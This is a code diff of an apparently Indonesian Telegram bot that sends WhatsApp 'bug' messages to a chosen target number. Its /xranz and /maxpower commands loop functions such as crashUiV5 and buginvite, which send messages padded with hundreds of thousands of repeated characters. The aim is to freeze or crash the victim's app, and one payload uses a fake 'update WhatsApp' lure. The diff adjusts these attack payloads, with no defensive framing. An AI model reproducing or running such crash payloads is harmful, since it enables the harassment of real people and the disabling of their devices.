@@ -451,7 +451,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 ╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
 │
 ㅒ
-│ /xcbeta
+│ /xcranz
 │ /maxpower
 ㅒ
 │
@@ -1441,7 +1441,7 @@ const QBug = {
     }
   }
 };
-bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1459,11 +1459,10 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 20; i++) {
-        await crashcursor(target, { ptcp: true });
-        await BlankScreen(target, { ptcp: true });
+  for (let i = 0; i < 3; i++) {
+        await crashUiV5(target, { ptcp: true });
         await buginvite(target, { ptcp: true });
-        await crashcursor(target, { ptcp: true });
+        
   }
 
   // Menyelesaikan proses response
@@ -1487,9 +1486,10 @@ bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx =
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 2; i++) {
     await crashcursor(target, { ptcp: true });
     await InVisiLoc(target, { ptcp: true });
+    await bokep(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -2578,7 +2578,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Send Qris Pnyamu" + "Canda bg".repeat(45000),
+title: "Yuk, Update Aplikasi WhatsApp sekarang Juga!! Dan coba fitur terbaru nya😇" + "ꦽ".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
@@ -2754,7 +2754,7 @@ async function buginvite(target, ptcp = true) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "Assalamualaikum Bang?" + "ꦾ".repeat(120000),
+                        newsletterName: "Send Qris pnyamu" + "ꦾ".repeat(120000),
                         jpegThumbnail: "",
                         caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                         inviteExpiration: Date.now() + 1814400000, // 21 hari
@@ -2817,7 +2817,7 @@ async function crashUiV5(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "@0".repeat(250000) + "ꦾ".repeat(100000)
+                        text: "Send Qris Pnyamu" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                     },
                     nativeFlowMessage: {
                         buttons: [
@@ -2996,7 +2996,7 @@ async function bokep(target, ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Wanna With Yours. :D" + "ꦾ".repeat(3)
+                        text: "Send Qris Pnyamu" + "ꦽ".repeat(3)
                     },
                     nativeFlowMessage: {
                         "buttons": [
